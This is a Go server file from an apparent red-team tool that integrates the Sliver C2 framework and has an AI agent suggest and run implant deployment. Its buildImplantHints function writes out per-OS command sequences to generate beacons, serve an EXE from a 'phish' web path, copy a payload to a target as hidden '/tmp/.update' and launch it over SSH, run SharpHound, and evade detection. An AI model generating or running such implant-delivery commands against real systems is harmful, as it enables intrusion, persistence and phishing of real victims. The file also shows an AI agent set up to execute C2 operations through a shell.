package server

// Sliver C2 integration.
//
// ARTEX acts as an operator console: it stores connection configs (host, certs),
// runs `sliver-client` as a subprocess on demand via the Bash tool, and provides
// an AI chat interface where the analyst can ask "how do I get an implant on
// 10.10.1.5?" and the agent uses the classify/ATT&CK data plus the finding context
// to suggest generate-* and deploy commands.
//
// Live Sliver gRPC integration requires the sliver-client binary to be installed
// and the operator's .sliver config file imported. All heavy lifting goes through
// the existing Bash tool so there is no grpc dependency to vendor.

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"

	"github.com/Autumn-27/artex/db"
)

// listSliverConfigs returns all stored server configs (no keys).
func (s *Server) listSliverConfigs(w http.ResponseWriter, r *http.Request) {
	if s.m.pg == nil {
		writeErr(w, 503, "database unavailable")
		return
	}
	list, err := s.m.pg.ListSliverConfigs()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, list)
}

// createSliverConfig stores a new Sliver server config.
func (s *Server) createSliverConfig(w http.ResponseWriter, r *http.Request) {
	if s.m.pg == nil {
		writeErr(w, 503, "database unavailable")
		return
	}
	var c db.SliverConfig
	if err := json.NewDecoder(r.Body).Decode(&c); err != nil {
		writeErr(w, 400, "invalid JSON")
		return
	}
	got, err := s.m.pg.CreateSliverConfig(c)
	if err != nil {
		writeErr(w, 422, err.Error())
		return
	}
	writeJSON(w, 201, got)
}

// getSliverConfig returns one config.
func (s *Server) getSliverConfig(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "invalid id")
		return
	}
	if s.m.pg == nil {
		writeErr(w, 503, "database unavailable")
		return
	}
	c, err := s.m.pg.GetSliverConfig(id)
	if err != nil {
		if errors.Is(err, db.ErrSliverConfigNotFound) {
			writeErr(w, 404, err.Error())
		} else {
			writeErr(w, 500, err.Error())
		}
		return
	}
	writeJSON(w, 200, c)
}

// deleteSliverConfig removes a config.
func (s *Server) deleteSliverConfig(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "invalid id")
		return
	}
	if s.m.pg == nil {
		writeErr(w, 503, "database unavailable")
		return
	}
	if err := s.m.pg.DeleteSliverConfig(id); err != nil {
		if errors.Is(err, db.ErrSliverConfigNotFound) {
			writeErr(w, 404, err.Error())
		} else {
			writeErr(w, 500, err.Error())
		}
		return
	}
	w.WriteHeader(204)
}

// sliverImplantHints returns AI-guided implant acquisition steps for a target asset/finding.
// This is a purely advisory endpoint — the agent will use the Bash tool to actually run
// the sliver-client commands on the operator's behalf once a conversation is started.
func (s *Server) sliverImplantHints(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	os := r.URL.Query().Get("os")
	findingIDStr := r.URL.Query().Get("finding_id")

	context := "generic"
	if s.m.pg != nil && findingIDStr != "" {
		if fid, err := parseInt64(findingIDStr); err == nil {
			if f, err := s.m.pg.GetFinding(fid); err == nil && f != nil {
				context = f.VulnClass + " — " + f.Name
			}
		}
	}
	if os == "" {
		os = "linux"
	}

	hints := buildImplantHints(target, os, context)
	writeJSON(w, 200, hints)
}

type implantHints struct {
	Target    string   `json:"target"`
	OS        string   `json:"os"`
	Context   string   `json:"context"`
	Strategy  string   `json:"strategy"`
	Commands  []string `json:"commands"`
	Notes     string   `json:"notes"`
}

func buildImplantHints(target, os, ctx string) implantHints {
	h := implantHints{Target: target, OS: os, Context: ctx}
	switch os {
	case "windows":
		h.Strategy = "Generate a Windows beacon, deliver via macro or EXE, establish persistence"
		h.Commands = []string{
			"sliver > generate beacon --os windows --arch amd64 --format exe --save /tmp/" + c2SafeName(target) + ".exe",
			"sliver > websites add-content --website phish --web-path /update.exe --content /tmp/" + c2SafeName(target) + ".exe",
			"sliver > http",
			"# After callback:",
			"sliver > beacons",
			"sliver [beacon] > info",
			"sliver [beacon] > execute-assembly /path/to/SharpHound.exe",
		}
		h.Notes = "Ensure OPSEC: use --evasion flag, consider process injection via migrate"
	case "macos":
		h.Strategy = "Generate macOS implant, deliver via LaunchAgent or dylib"
		h.Commands = []string{
			"sliver > generate --os mac --arch amd64 --format macho --save /tmp/" + c2SafeName(target),
			"sliver > mtls --lport 4444",
			"sliver [session] > execute /path/to/implant",
		}
		h.Notes = "Consider SIP bypass if needed; arm64 (Apple Silicon) needs --arch arm64"
	default: // linux
		h.Strategy = "Generate ELF beacon, deploy via SSH/RCE exploit, establish persistence"
		h.Commands = []string{
			"sliver > generate beacon --os linux --arch amd64 --format elf --save /tmp/" + c2SafeName(target),
			"sliver > mtls --lport 4444",
			"# Transfer and execute:",
			"scp /tmp/" + c2SafeName(target) + " user@" + nzStr(target, "TARGET") + ":/tmp/.update",
			"ssh user@" + nzStr(target, "TARGET") + " 'chmod +x /tmp/.update && /tmp/.update &'",
			"sliver > beacons",
		}
		h.Notes = "For RCE exploits, use 'execute-shellcode' or pipe via bash one-liner"
	}
	return h
}

func c2SafeName(s string) string {
	out := make([]byte, 0, len(s))
	for _, c := range []byte(s) {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' {
			out = append(out, c)
		} else {
			out = append(out, '_')
		}
	}
	if len(out) == 0 {
		return "implant"
	}
	return string(out)
}

func nzStr(s, def string) string {
	if s == "" {
		return def
	}
	return s
}

func parseInt64(s string) (int64, error) {
	var n int64
	_, err := fmt.Sscanf(s, "%d", &n)
	return n, err
}
